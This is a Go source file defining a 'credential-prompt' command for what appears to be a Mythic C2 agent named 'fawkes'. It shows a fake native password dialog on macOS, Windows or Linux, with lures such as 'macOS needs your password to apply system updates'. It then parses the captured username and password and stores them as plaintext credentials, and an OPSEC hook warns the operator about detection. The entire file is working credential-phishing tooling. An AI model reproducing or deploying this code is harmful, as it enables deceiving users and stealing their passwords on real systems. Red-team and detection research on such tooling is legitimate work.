package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "credential-prompt",
		Description:         "Display a native credential dialog to capture user credentials. macOS: AppleScript dialog. Windows: CredUI prompt. Linux: zenity/kdialog/yad.",
		HelpString:          "credential-prompt [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution]",
		Version:             2,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credential_prompt_new.js"),
			Author:     "@galoryber",
		},
		MitreAttackMappings: []string{"T1056.002"}, // Input Capture: GUI Input Capture
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "title",
				ModalDisplayName: "Dialog Title",
				CLIName:          "title",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Title bar text for the dialog. Default: Update Required",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "message",
				ModalDisplayName: "Dialog Message",
				CLIName:          "message",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Body text displayed in the dialog. Default: macOS needs your password to apply system updates.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "icon",
				ModalDisplayName: "Icon",
				CLIName:          "icon",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"caution", "note", "stop"},
				Description:      "Dialog icon: caution (warning triangle), note (info), or stop (critical)",
				DefaultValue:     "caution",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			title, _ := taskData.Args.GetStringArg("title")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Credential prompt dialog (\"%s\"). Displays a Windows credential dialog to the user. If the user is suspicious or reports it, the operation may be compromised. The dialog appears from the agent process context, which may look unusual.", title),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			title, _ := taskData.Args.GetStringArg("title")
			if title == "" {
				title = "Update Required"
			}
			display := fmt.Sprintf("title: %s", title)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "User Interaction", fmt.Sprintf("GUI credential prompt: %s", title))
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Parse output format:
			//   User:     <username>
			//   Password: <password>
			var username, password string
			for _, line := range strings.Split(responseText, "\n") {
				trimmed := strings.TrimSpace(line)
				if strings.HasPrefix(trimmed, "User:") {
					username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
				} else if strings.HasPrefix(trimmed, "Password:") {
					password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
				}
			}
			if username != "" && password != "" {
				registerCredentials(processResponse.TaskData.Task.ID, []mythicrpc.MythicRPCCredentialCreateCredentialData{
					{
						CredentialType: "plaintext",
						Realm:          "local",
						Account:        username,
						Credential:     password,
						Comment:        "credential-prompt dialog capture",
					},
				})
			}
			return response
		},
	})
}
